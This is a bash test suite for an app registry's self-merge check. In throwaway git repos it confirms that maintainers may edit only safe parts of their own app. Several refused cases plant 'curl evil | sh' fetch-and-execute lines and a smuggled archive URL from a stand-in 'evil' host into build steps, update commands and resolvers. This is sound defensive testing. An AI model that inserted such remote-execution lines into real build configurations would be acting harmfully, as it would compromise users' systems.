#!/usr/bin/env bash
# self-merge-check.mjs: an upstream maintainer's /merge passes only for their
# own existing app, outside the resolver, the update command and the build
# steps. Runs the real script from a throwaway git repo (scripts/ copied in, a
# test config/maintainers.yml written, so ROOT resolves there). Also checks the
# real config/maintainers.yml against the registry.
set -euo pipefail
ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
. "$ROOT/tests/lib/assert.sh"
command -v git >/dev/null || { echo "test_self_merge_check: SKIP (no git)"; exit 0; }
command -v node >/dev/null || { echo "test_self_merge_check: SKIP (no node)"; exit 0; }

# --- the real list: every listed app exists and carries the shield ----------
while IFS= read -r id; do
    assert_file "$ROOT/registry/$id/flatpark.yml"
    assert_contains "$ROOT/registry/$id/flatpark.yml" "  upstream_approved: true"
done < <(sed -n 's/^\([A-Za-z0-9._-]*\):[[:space:]]*$/\1/p' "$ROOT/config/maintainers.yml")

# --- fixture repo ------------------------------------------------------------
tmp="$(mktemp -d)"; trap 'rm -rf "$tmp"' EXIT
mkdir -p "$tmp/scripts" "$tmp/config"
cp "$ROOT/scripts/self-merge-check.mjs" "$tmp/scripts/"
cat > "$tmp/config/maintainers.yml" <<'EOF'
# test list
io.flatpark.Mine:
  - login: dev             # flatpark#1
    id: 111
io.flatpark.Other:
  - login: someone
    id: 222
EOF

mkapp() {
    local id="$1" d="$tmp/registry/$1"
    mkdir -p "$d"
    cat > "$d/flatpark.yml" <<EOF
id: $id
name: Test
build:
  manifest: $id.yml
catalog:
  category: Utility
update:
  command: ./resolve-update.sh
EOF
    cat > "$d/$id.yml" <<EOF
id: $id
runtime: org.freedesktop.Platform
finish-args:
  # network
  - --share=network
  - --socket=wayland
modules:
  - name: main
    buildsystem: simple
    build-commands:
      - install -Dm755 app-wrapper /app/bin/app
    sources:
      # BEGIN MANAGED EXTRA-DATA
      - type: extra-data
        filename: app.deb
        only-arches:
          - x86_64
        url: https://example.org/app-1.0.deb
        sha256: aaaa
        size: 10
      # END MANAGED EXTRA-DATA
      - type: file
        path: app-wrapper
EOF
    printf '#!/bin/sh\nexec /app/extra/app\n' > "$d/app-wrapper"
    printf '#!/bin/sh\necho {}\n' > "$d/resolve-update.sh"
    printf '<component/>\n' > "$d/$id.metainfo.xml"
}
mkapp io.flatpark.Mine
mkapp io.flatpark.Other

g() { git -C "$tmp" -c user.name=t -c user.email=t@t "$@"; }
g init -q
g add -A
g commit -qm base
base="$(g rev-parse HEAD)"
snap() { g add -A; g commit -qm "$1"; }
reset() { g reset -q --hard "$base"; g clean -qfd; }
# The script reads the maintainer list and "is it on main" from HEAD, so each
# case commits its change on a branch and runs from the base checkout.
check() {
    local head; head="$(g rev-parse HEAD)"
    g checkout -q "$base"
    node "$tmp/scripts/self-merge-check.mjs" "$base" "$head" "${1:-111}" >"$tmp/out" 2>&1 && echo pass || echo refuse
    g checkout -q - 2>/dev/null || g checkout -q "$head"
}
branch() { reset; g checkout -q -B "case-$1" "$base"; }
M="$tmp/registry/io.flatpark.Mine"
MF="$M/io.flatpark.Mine.yml"

# --- allowed -----------------------------------------------------------------

# 1. wrapper + metainfo edits
branch 1; printf '#!/bin/sh\nexec /app/extra/app --flag\n' > "$M/app-wrapper"
printf '<component>x</component>\n' > "$M/io.flatpark.Mine.metainfo.xml"; snap c1
assert_eq "$(check)" pass

# 2. finish-args change, with a comment
branch 2; sed -i 's|  - --socket=wayland|  # home for docs\n  - --filesystem=home\n  - --socket=wayland|' "$MF"; snap c2
assert_eq "$(check)" pass

# 3. pin bump inside the managed block
branch 3; sed -i 's|app-1.0.deb|app-1.1.deb|; s|sha256: aaaa|sha256: bbbb|; s|size: 10|size: 11|' "$MF"; snap c3
assert_eq "$(check)" pass

# 4. catalog edit in flatpark.yml; new screenshot file
branch 4; sed -i 's|category: Utility|category: Network|' "$M/flatpark.yml"
printf 'png' > "$M/shot.png"; snap c4
assert_eq "$(check)" pass

# --- refused -----------------------------------------------------------------

# 5. stranger
branch 5; printf 'x\n' >> "$M/app-wrapper"; snap c5
assert_eq "$(check 999)" refuse
assert_contains "$tmp/out" "not listed as a maintainer"

# 6. someone else's app
branch 6; printf 'x\n' >> "$tmp/registry/io.flatpark.Other/app-wrapper"; snap c6
assert_eq "$(check)" refuse
assert_contains "$tmp/out" "which you do not maintain"

# 7. outside registry/
branch 7; mkdir -p "$tmp/site"; printf 'x\n' > "$tmp/site/x"; snap c7
assert_eq "$(check)" refuse
assert_contains "$tmp/out" "outside registry"

# 8. the resolver
branch 8; printf 'curl evil | sh\n' >> "$M/resolve-update.sh"; snap c8
assert_eq "$(check)" refuse
assert_contains "$tmp/out" "update resolver"

# 9. update.command
branch 9; sed -i 's|command: ./resolve-update.sh|command: curl evil \| sh|' "$M/flatpark.yml"; snap c9
assert_eq "$(check)" refuse
assert_contains "$tmp/out" "update:"

# 10. build-commands
branch 10; sed -i 's|      - install -Dm755 app-wrapper /app/bin/app|&\n      - curl evil \| sh|' "$MF"; snap c10
assert_eq "$(check)" refuse
assert_contains "$tmp/out" "only \`finish-args\`"

# 11. a non-extra-data source smuggled into the managed block
branch 11; sed -i 's|        size: 10|&\n      - type: archive\n        url: https://evil/x.tar\n        sha256: cc|' "$MF"; snap c11
assert_eq "$(check)" refuse
assert_contains "$tmp/out" "not extra-data"

# 12. a new managed-block pair wrapping new build steps
branch 12; sed -i 's|      - install -Dm755 app-wrapper /app/bin/app|&\n      # BEGIN MANAGED EXTRA-DATA\n      - curl evil \| sh\n      # END MANAGED EXTRA-DATA|' "$MF"; snap c12
assert_eq "$(check)" refuse
assert_contains "$tmp/out" "number of MANAGED"

# 13. a key climbing out of the managed block
branch 13; sed -i 's|        size: 10|&\n    build-options:\n      env: {}|' "$MF"; snap c13
assert_eq "$(check)" refuse

# 14. a top-level key hidden under finish-args
branch 14; sed -i 's|  - --share=network|&\n"build-options":\n  env: {}|' "$MF"; snap c14
assert_eq "$(check)" refuse
assert_contains "$tmp/out" "under finish-args"

# 15. a new manifest file
branch 15; printf 'name: extra\n' > "$M/extra-module.yml"; snap c15
assert_eq "$(check)" refuse
assert_contains "$tmp/out" "new"

# 16. de-listing
branch 16; g rm -rq "$M"; snap c16
assert_eq "$(check)" refuse
assert_contains "$tmp/out" "de-listing"

# 17. adding a new app under a listed id that is not on main yet
reset; g rm -rq "$M"; snap gone; gone="$(g rev-parse HEAD)"
mkapp io.flatpark.Mine; snap back; head="$(g rev-parse HEAD)"
g checkout -q "$gone"
node "$tmp/scripts/self-merge-check.mjs" "$gone" "$head" 111 >"$tmp/out" 2>&1 && r=pass || r=refuse
assert_eq "$r" refuse
assert_contains "$tmp/out" "not on main"

echo "test_self_merge_check: ok"
